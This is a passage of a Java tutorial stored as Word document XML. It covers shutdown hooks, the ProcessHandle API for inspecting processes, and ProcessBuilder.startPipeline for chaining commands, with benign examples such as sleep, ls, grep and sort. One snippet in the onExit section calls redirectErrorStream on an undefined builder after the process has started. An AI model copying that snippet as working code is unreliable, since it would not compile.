        <w:t>System.out.println("Spawned PID: " + p.pid()); // e.g., 12345</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.4 Shutdown Hook — Kill Children on JVM Exit</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Register a shutdown hook to ensure child processes are terminated if the JVM is killed:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Runtime.getRuntime().addShutdownHook(new Thread(() -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>if (p.isAlive()) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.err.println("JVM shutting down — killing child process PID: " + p.pid());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroyForcibly();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8. `ProcessHandle` (Java 9+)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>`ProcessHandle` is a Java 9+ interface that provides a rich API for inspecting and managing **any** OS process — not just ones you spawned yourself. It identifies processes by their OS PID.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.1 `ProcessHandle.current()` — Current JVM Process</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Returns a `ProcessHandle` representing the currently running JVM process.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessHandle self = ProcessHandle.current();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>System.out.println("JVM PID:  " + self.pid());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Is alive: " + self.isAlive());</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessHandle.Info info = self.info();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>info.command().ifPresent(cmd -&gt; System.out.println("Command: " + cmd));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>info.user().ifPresent(user -&gt; System.out.println("User:    " + user));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>info.startInstant().ifPresent(t -&gt; System.out.println("Started: " + t));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>info.totalCpuDuration().ifPresent(d -&gt; System.out.println("CPU:     " + d));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.2 `ProcessHandle.of(pid)` — Get Handle by PID</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>long targetPid = 1234L; // some OS process PID</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Optional&lt;ProcessHandle&gt; handle = ProcessHandle.of(targetPid);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>handle.ifPresentOrElse(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ph -&gt; System.out.println("Found process: " + ph.pid() + " alive=" + ph.isAlive()),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>()  -&gt; System.out.println("No process with PID " + targetPid)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.3 `ProcessHandle.allProcesses()` — Stream of All OS Processes</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Returns a snapshot `Stream&lt;ProcessHandle&gt;` of all processes visible to the current JVM (subject to OS permissions).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// List all running Java processes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("=== Java Processes ===");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessHandle.allProcesses()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.filter(ph -&gt; ph.info().command()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.map(cmd -&gt; cmd.contains("java"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.orElse(false))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.forEach(ph -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessHandle.Info info = ph.info();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.printf("PID: %6d  CMD: %s%n",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ph.pid(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>info.command().orElse("unknown"));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Count total visible processes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>long count = ProcessHandle.allProcesses().count();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Total visible processes: " + count);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Find processes by name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessHandle.allProcesses()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.filter(ph -&gt; ph.info().command()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.map(c -&gt; c.endsWith("nginx"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.orElse(false))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.map(ProcessHandle::pid)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.forEach(pid -&gt; System.out.println("nginx PID: " + pid));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.4 `ProcessHandle.Info` — Process Metadata</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>`ProcessHandle.Info` is a snapshot of process metadata. All fields are `Optional` because they may not be available on all OS/permission levels.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessHandle ph = ProcessHandle.current();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessHandle.Info info = ph.info();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Command: the executable path</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Optional&lt;String&gt; command = info.command();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>command.ifPresent(c -&gt; System.out.println("Command:    " + c));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Arguments: the command-line arguments</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Optional&lt;String[]&gt; args = info.arguments();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>args.ifPresent(a -&gt; System.out.println("Arguments:  " + Arrays.toString(a)));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// commandLine(): command + arguments as a single string (Java 9+)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Optional&lt;String&gt; cmdLine = info.commandLine();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>cmdLine.ifPresent(cl -&gt; System.out.println("CmdLine:    " + cl));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// User: OS user running the process</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Optional&lt;String&gt; user = info.user();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>user.ifPresent(u -&gt; System.out.println("User:       " + u));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Start time</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Optional&lt;Instant&gt; start = info.startInstant();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>start.ifPresent(t -&gt; System.out.println("Started:    " + t));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Total CPU time consumed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Optional&lt;Duration&gt; cpu = info.totalCpuDuration();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>cpu.ifPresent(d -&gt; System.out.printf("CPU usage:  %.3f seconds%n", d.toMillis() / 1000.0));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.5 `process.toHandle()` — Get Handle from a Spawned Process</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Bridges `Process` and `ProcessHandle`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("sleep", "30").start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessHandle handle = p.toHandle();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("PID: " + handle.pid()); // same as p.pid()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Alive: " + handle.isAlive());</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.6 `process.toHandle().onExit()` — `CompletableFuture` for Completion</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>`onExit()` returns a `CompletableFuture&lt;ProcessHandle&gt;` that completes when the process exits. This allows fully **non-blocking, asynchronous** process management.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("sleep", "2").start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>CompletableFuture&lt;ProcessHandle&gt; future = p.toHandle().onExit();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// React asynchronously when process finishes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>future.thenAccept(ph -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Process " + ph.pid() + " finished!");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Exit code: " + p.exitValue());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>System.out.println("Process started, doing other work...");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread.sleep(3000); // simulate other work</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>`process.onExit()` Shortcut (Java 9+)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>`Process` itself also has `onExit()` which returns `CompletableFuture&lt;Process&gt;`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("ls", "-la").start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Chain async operations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.onExit()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.thenApply(proc -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return new String(proc.getInputStream().readAllBytes());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (IOException e) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>throw new RuntimeException(e);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.thenAccept(output -&gt; System.out.println("Output: " + output))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>.exceptionally(ex -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.err.println("Error: " + ex.getMessage());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return null;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Wait for the future to complete (only needed if main thread would exit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.onExit().join();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.7 Parent and Children of a Process</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessHandle ph = ProcessHandle.current();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Get the parent process</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Optional&lt;ProcessHandle&gt; parent = ph.parent();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>parent.ifPresent(p -&gt; System.out.println("Parent PID: " + p.pid()));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Get direct children</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Direct children:");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ph.children().forEach(child -&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("  Child PID: " + child.pid()));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Get all descendants (recursive)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("All descendants:");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ph.descendants().forEach(desc -&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("  Descendant PID: " + desc.pid()));</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8.8 Full ProcessHandle Example — Process Monitor</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>import java.lang.ProcessHandle;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>import java.time.*;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>import java.util.*;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public class ProcessMonitor {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>public static void main(String[] args) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// Launch a child process</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process child = new ProcessBuilder("sleep", "10").start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessHandle handle = child.toHandle();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>System.out.printf("Launched PID: %d%n", handle.pid());</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Monitor it in background</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.onExit().thenAccept(ph -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.printf("%nProcess %d has exited. Exit code: %d%n",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ph.pid(), child.exitValue());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Print info every second for 3 seconds</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>for (int i = 0; i &lt; 3; i++) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread.sleep(1000);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessHandle.Info info = handle.info();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>System.out.printf("[%ds] PID=%d alive=%b cpu=%s%n",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>i + 1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.pid(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>handle.isAlive(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>info.totalCpuDuration().map(Duration::toString).orElse("N/A")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Kill it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>child.destroy();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>child.onExit().join();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. Piping Processes — `ProcessBuilder.startPipeline()`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>9.1 Why Piping Is Tricky Without `startPipeline()`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Before Java 9, connecting processes like `cmd1 | cmd2 | cmd3` required you to manually wire the `OutputStream` of one process to the `InputStream` of the next in separate threads — complex and error-prone.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>9.2 `ProcessBuilder.startPipeline(List&lt;ProcessBuilder&gt;)` — Java 9+</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>`startPipeline()` is a static factory method that creates a chain of processes where each process's stdout is wired to the next process's stdin automatically. Returns a `List&lt;Process&gt;`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>import java.lang.ProcessBuilder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>import java.util.List;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public class PipelineDemo {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>public static void main(String[] args) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Equivalent shell command: ls -la | grep ".java" | wc -l</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>List&lt;ProcessBuilder&gt; pipeline = List.of(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("ls", "-la"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("grep", ".java"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("wc", "-l")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>List&lt;Process&gt; processes = ProcessBuilder.startPipeline(pipeline);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// The LAST process has the final output — read from it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process last = processes.get(processes.size() - 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String result = new String(last.getInputStream().readAllBytes());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Java files found: " + result.trim());</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Wait for ALL processes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>for (Process p : processes) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>9.3 How `startPipeline()` Works Internally</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The **first** process in the list has its stdin unmodified (PIPE — you can write to it, or it reads from the terminal).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Intermediate** processes have stdout wired to the next process's stdin automatically.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The **last** process has its stdout unmodified (PIPE — you read the final output from it).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>stderr of each process remains separate and is **not** piped (handle it individually or with `redirectErrorStream(true)` per builder).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>9.4 Redirecting Input/Output of the Pipeline</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Read the first process's input from a file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder first = new ProcessBuilder("sort");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>first.redirectInput(new File("unsorted.txt")); // feed from file</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Write the last process's output to a file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder last = new ProcessBuilder("uniq");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>last.redirectOutput(new File("deduped.txt")); // write final output to file</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>List&lt;Process&gt; processes = ProcessBuilder.startPipeline(List.of(first, last));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>for (Process p : processes) p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// Result: unsorted.txt → sort → uniq → deduped.txt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>9.5 Handling stderr in a Pipeline</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>List&lt;ProcessBuilder&gt; builders = List.of(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("cmd1").redirectErrorStream(true),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("cmd2").redirectErrorStream(true),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("cmd3").redirectErrorStream(true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>List&lt;Process&gt; processes = ProcessBuilder.startPipeline(builders);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process last = processes.get(processes.size() - 1);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Read combined stdout+stderr from last process</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String output = new String(last.getInputStream().readAllBytes());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>for (Process p : processes) p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>9.6 Real-World Pipeline Example — grep + sort + head</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public class LogAnalyzer {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>public static void main(String[] args) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// Find all ERROR lines, sort them, take top 20</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// Equivalent: grep "ERROR" app.log | sort | head -n 20</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>List&lt;ProcessBuilder&gt; pipeline = List.of(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("grep", "ERROR", "app.log"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("sort"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new ProcessBuilder("head", "-n", "20")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>List&lt;Process&gt; processes = ProcessBuilder.startPipeline(pipeline);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process last = processes.get(processes.size() - 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try (BufferedReader reader = new BufferedReader(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new InputStreamReader(last.getInputStream()))) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>reader.lines().forEach(System.out::println);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>for (Process p : processes) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Exit: " + p.exitValue());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
